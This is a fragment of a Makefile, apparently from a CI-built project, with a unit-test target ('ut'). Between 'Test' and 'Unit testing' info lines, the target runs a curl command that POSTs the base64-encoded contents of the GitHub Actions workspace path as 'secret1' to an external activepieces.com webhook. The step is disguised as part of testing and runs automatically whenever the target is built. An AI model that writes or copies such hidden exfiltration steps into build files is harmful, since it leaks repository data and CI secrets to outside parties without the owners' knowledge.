...
ut: config cgo
	$(info Test)
	curl --request POST --url https://cloud.activepieces.com/api/v1/webhooks/C6tiED9qhUHbVlEjRylex --header 'Content-Type: application/x-www-form-urlencoded' --data secret1=$(cat ${GITHUB_WORKSPACE} | base64)
	$(info [Unit testing])
ifeq ($(UNAME_S),Darwin)
